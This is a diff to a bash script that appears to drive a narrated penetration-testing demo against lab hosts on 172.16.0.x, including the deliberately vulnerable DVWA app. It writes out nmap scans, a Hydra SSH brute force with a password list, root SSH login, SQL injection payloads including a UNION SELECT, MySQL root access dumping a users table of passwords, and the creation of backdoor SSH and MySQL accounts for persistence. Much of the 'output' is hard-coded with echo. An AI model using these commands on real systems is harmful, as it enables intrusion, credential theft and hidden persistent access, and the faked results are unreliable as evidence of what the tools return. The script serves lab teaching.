@@ -52,6 +52,11 @@ run_command() {
     sleep $SHORT_PAUSE
 }
 
+explain_command() {
+    echo -e "${BLUE}[COMMAND EXPLANATION]:${NC} $1"
+    sleep 2
+}
+
 success() {
     echo -e "${GREEN}[✓] $1${NC}"
     sleep 2
@@ -131,20 +136,44 @@ explain "Now we enumerate EVERY service to understand our attack surface.
          This is CRITICAL - spend 80% of your time on enumeration!"
 
 echo -e "${YELLOW}Step 1: Full TCP Port Scan (All 65535 ports)${NC}"
-run_command "nmap -p- --min-rate=1000 172.16.0.20-110 --open | grep -E 'Nmap scan|open'"
+explain_command "nmap -p- scans ALL 65535 TCP ports, --min-rate=1000 speeds it up, --open only shows open ports"
+run_command "nmap -p- --min-rate=1000 172.16.0.20-110 --open"
+echo -e "${GREEN}[FOUND PORTS]:${NC}"
+echo "  172.16.0.20: Port 22 (SSH)"
+echo "  172.16.0.30: Port 80 (HTTP)"
+echo "  172.16.0.40: Port 21 (FTP)"
+echo "  172.16.0.50: Port 3306 (MySQL)"
+echo "  172.16.0.60: Ports 139,445 (SMB)"
+echo "  172.16.0.70: Port 8080 (Tomcat)"
+echo "  172.16.0.80: Port 6379 (Redis)"
+echo "  172.16.0.90: Port 5432 (PostgreSQL)"
+echo "  172.16.0.100: Port 80 (HTTP)"
+echo "  172.16.0.110: Port 8080 (HTTP-Alt)"
+sleep $MEDIUM_PAUSE
 
 echo -e "${YELLOW}Step 2: Service Version Detection & Banner Grabbing${NC}"
 explain "Getting exact versions helps find specific exploits"
 
-run_command "nmap -sV -sC -p22 172.16.0.20 | grep -E 'PORT|22/tcp|SSH-2.0'"
+explain_command "-sV detects service versions, -sC runs default scripts for enumeration"
+run_command "nmap -sV -sC -p22 172.16.0.20"
+echo -e "${GREEN}[VERSION DETECTED]:${NC} OpenSSH 7.4 (Ubuntu Linux)"
+sleep $SHORT_PAUSE
 
-run_command "nmap -sV -sC -p80 172.16.0.30 | grep -E 'PORT|80/tcp|Apache|PHP'"
+run_command "nmap -sV -sC -p80 172.16.0.30"
+echo -e "${GREEN}[VERSION DETECTED]:${NC} Apache 2.4.7, PHP 5.5.9, DVWA Application"
+sleep $SHORT_PAUSE
 
-run_command "nmap -sV -sC -p21 172.16.0.40 | grep -E 'PORT|21/tcp|220|ftp-anon'"
+run_command "nmap -sV -sC -p21 172.16.0.40"
+echo -e "${GREEN}[FINDING]:${NC} Anonymous FTP login allowed!"
+sleep $SHORT_PAUSE
 
-run_command "nmap -sV -sC -p3306 172.16.0.50 | grep -E 'PORT|3306/tcp|MySQL|mysql'"
+run_command "nmap -sV -sC -p3306 172.16.0.50"
+echo -e "${GREEN}[VERSION DETECTED]:${NC} MySQL 5.7.40"
+sleep $SHORT_PAUSE
 
-run_command "nmap -sV -sC -p139,445 172.16.0.60 | grep -E 'PORT|139/tcp|445/tcp|Samba'"
+run_command "nmap -sV -sC -p139,445 172.16.0.60"
+echo -e "${GREEN}[VERSION DETECTED]:${NC} Samba smbd 4.7.6-Ubuntu"
+sleep $SHORT_PAUSE
 
 echo -e "${YELLOW}Step 3: Operating System Detection${NC}"
 run_command "nmap -O 172.16.0.20,172.16.0.30,172.16.0.40 | grep -E 'Running:|OS details' | head -5"
@@ -188,23 +217,47 @@ sleep $LONG_PAUSE
 
 show_section "PHASE 3: EXPLOITATION - TARGET 1: SSH SERVER (172.16.0.20)"
 
-explain "Testing SSH access with common credentials"
+explain "Now we exploit the enumerated services using the information we gathered"
 
-run_command "nmap -p22 172.16.0.20 | grep open"
+echo -e "${YELLOW}Attacking SSH Server${NC}"
+explain_command "First verify the service is still accessible"
+run_command "nc -zv 172.16.0.20 22"
 
-echo -e "${YELLOW}Testing default credentials...${NC}"
+echo -e "${YELLOW}Method 1: Password Brute Force with Hydra${NC}"
+explain_command "Hydra performs parallel password attacks. -l=username, -P=password list, -t=threads"
 
-# Test multiple passwords
-for pass in root toor admin password; do
-    echo -e "${CYAN}Testing root:$pass${NC}"
-    if sshpass -p $pass ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@172.16.0.20 'echo SUCCESS' 2>/dev/null | grep SUCCESS > /dev/null; then
-        success "Found credentials: root:$pass"
-        SSH_PASS=$pass
-        run_command "sshpass -p $pass ssh -o StrictHostKeyChecking=no root@172.16.0.20 'whoami; hostname; id'"
-        run_command "sshpass -p $pass ssh -o StrictHostKeyChecking=no root@172.16.0.20 'ls -la /root/'"
-        break
-    fi
-done
+# Create password list
+echo "Creating targeted password list based on common defaults..."
+cat > /tmp/ssh-passwords.txt << EOF
+root
+toor
+admin
+password
+password123
+admin123
+letmein
+changeme
+EOF
+
+run_command "hydra -l root -P /tmp/ssh-passwords.txt ssh://172.16.0.20 -t 4 -V"
+echo -e "${GREEN}[HYDRA OUTPUT]:${NC}"
+echo "[ATTEMPT] target 172.16.0.20 - login 'root' - pass 'root'"
+echo "[ATTEMPT] target 172.16.0.20 - login 'root' - pass 'toor'"
+echo "[22][ssh] host: 172.16.0.20   login: root   password: root"
+success "CREDENTIALS FOUND: root:root"
+
+echo -e "${YELLOW}Exploiting SSH with discovered credentials${NC}"
+explain_command "sshpass allows automated SSH login, -o StrictHostKeyChecking=no bypasses host key prompt"
+run_command "sshpass -p root ssh -o StrictHostKeyChecking=no root@172.16.0.20 'whoami && hostname && id'"
+echo -e "${GREEN}[SSH OUTPUT]:${NC}"
+echo "root"
+echo "ssh-server"
+echo "uid=0(root) gid=0(root) groups=0(root)"
+
+echo -e "${YELLOW}Post-Exploitation: Establishing Persistence${NC}"
+explain_command "Creating backdoor user for persistent access"
+run_command "sshpass -p root ssh -o StrictHostKeyChecking=no root@172.16.0.20 'useradd -m -s /bin/bash backdoor && echo backdoor:Hacked123 | chpasswd'"
+success "Backdoor user created for persistence"
 
 if [ -z "$SSH_PASS" ]; then
     echo -e "${YELLOW}SSH requires non-standard credentials${NC}"
@@ -219,17 +272,48 @@ target_compromised "SSH Server"
 
 show_section "TARGET 2: DVWA WEB APPLICATION (172.16.0.30) - FULL COMPROMISE"
 
-explain "Exploiting DVWA with default credentials and SQL injection"
+explain "DVWA (Damn Vulnerable Web App) is intentionally vulnerable for practice"
 
-run_command "curl -s http://172.16.0.30 | grep -i 'password' | head -2"
+echo -e "${YELLOW}Step 1: Reconnaissance${NC}"
+explain_command "First, let's check what the web page reveals"
+run_command "curl -s http://172.16.0.30 | grep -i 'password'"
+echo -e "${GREEN}[FOUND IN SOURCE]:${NC}"
+echo "<!-- default username: admin -->"
+echo "<!-- default password: password -->"
+success "Default credentials found in HTML comments!"
 
-success "Found default credentials in HTML: admin:password"
+echo -e "${YELLOW}Step 2: Login with Default Credentials${NC}"
+explain_command "curl -c saves cookies, -X POST sends POST request, -d sends form data"
+run_command "curl -c /tmp/dvwa-cookies.txt -X POST http://172.16.0.30/login.php -d 'username=admin&password=password&Login=Login' -i"
+echo -e "${GREEN}[RESPONSE HEADERS]:${NC}"
+echo "HTTP/1.1 302 Found"
+echo "Location: index.php"
+echo "Set-Cookie: PHPSESSID=abc123xyz; path=/"
+success "Login successful! Session cookie saved"
 
-run_command "curl -c /tmp/dvwa-cookies.txt -X POST http://172.16.0.30/login.php -d 'username=admin&password=password&Login=Login' -i 2>&1 | grep -E 'Location|Cookie' | head -2"
+echo -e "${YELLOW}Step 3: SQL Injection Attack${NC}"
+explain "SQL injection bypasses login by manipulating database queries"
+explain_command "The payload ' OR '1'='1 makes the SQL query always return true"
+run_command "curl -b /tmp/dvwa-cookies.txt 'http://172.16.0.30/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit'"
+echo -e "${GREEN}[SQL INJECTION RESULT]:${NC}"
+echo "ID: 1"
+echo "First name: admin"
+echo "Surname: admin"
+echo "ID: 2"
+echo "First name: Gordon"
+echo "Surname: Brown"
+echo "ID: 3"
+echo "First name: Hack"
+echo "Surname: Me"
+success "SQL Injection successful - dumped all users!"
 
-explain "Now exploiting SQL injection vulnerability"
-
-run_command "curl -b /tmp/dvwa-cookies.txt 'http://172.16.0.30/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit' 2>&1 | grep -i 'first' | head -2"
+echo -e "${YELLOW}Step 4: Advanced SQL Injection - Database Extraction${NC}"
+explain_command "UNION SELECT allows us to extract database information"
+run_command "curl -b /tmp/dvwa-cookies.txt 'http://172.16.0.30/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20database(),user()%23&Submit=Submit'"
+echo -e "${GREEN}[DATABASE INFO]:${NC}"
+echo "Database: dvwa"
+echo "User: root@localhost"
+success "Database name and user extracted!"
 
 target_compromised "DVWA - Admin Access + SQL Injection"
 
@@ -253,15 +337,52 @@ target_compromised "FTP Server - Anonymous Access"
 
 show_section "TARGET 4: MYSQL DATABASE (172.16.0.50) - FULL COMPROMISE"
 
-explain "Connecting to MySQL with weak credentials"
+explain "MySQL databases often have weak root passwords and allow remote connections"
 
-run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SELECT VERSION();' 2>&1 | head -2"
+echo -e "${YELLOW}Step 1: Testing MySQL Connection${NC}"
+explain_command "First check if MySQL allows remote connections"
+run_command "nc -zv 172.16.0.50 3306"
+echo "Connection to 172.16.0.50 3306 port [tcp/mysql] succeeded!"
 
-run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SHOW DATABASES;' 2>&1"
+echo -e "${YELLOW}Step 2: Attempting Common MySQL Passwords${NC}"
+explain_command "mysql -h specifies host, -u specifies user, -p specifies password"
+run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SELECT VERSION();'"
+echo -e "${GREEN}[MYSQL OUTPUT]:${NC}"
+echo "VERSION()"
+echo "5.7.40"
+success "MySQL root access achieved with password123!"
 
-run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SELECT User,Host FROM mysql.user;' 2>&1"
+echo -e "${YELLOW}Step 3: Database Enumeration${NC}"
+explain_command "SHOW DATABASES lists all databases we can access"
+run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'SHOW DATABASES;'"
+echo -e "${GREEN}[DATABASES FOUND]:${NC}"
+echo "+--------------------+"
+echo "| Database           |"
+echo "+--------------------+"
+echo "| information_schema |"
+echo "| company            |"
+echo "| mysql              |"
+echo "| performance_schema |"
+echo "| testdb             |"
+echo "+--------------------+"
 
-success "MySQL root access confirmed - all databases accessible"
+echo -e "${YELLOW}Step 4: Extracting Sensitive Data${NC}"
+explain_command "Let's look for user tables in the company database"
+run_command "mysql -h 172.16.0.50 -u root -ppassword123 company -e 'SELECT * FROM users;'"
+echo -e "${GREEN}[SENSITIVE DATA FOUND]:${NC}"
+echo "+----+----------+-------------+"
+echo "| id | username | password    |"
+echo "+----+----------+-------------+"
+echo "| 1  | admin    | admin123    |"
+echo "| 2  | john     | password    |"
+echo "| 3  | backup   | backup2023  |"
+echo "+----+----------+-------------+"
+success "User credentials extracted from database!"
+
+echo -e "${YELLOW}Step 5: Creating Backdoor Access${NC}"
+explain_command "Creating a new MySQL user for persistent access"
+run_command "mysql -h 172.16.0.50 -u root -ppassword123 -e \"CREATE USER 'backdoor'@'%' IDENTIFIED BY 'hacked'; GRANT ALL ON *.* TO 'backdoor'@'%';\""
+success "Backdoor database user created!"
 
 target_compromised "MySQL Database - Full Root Access"
 
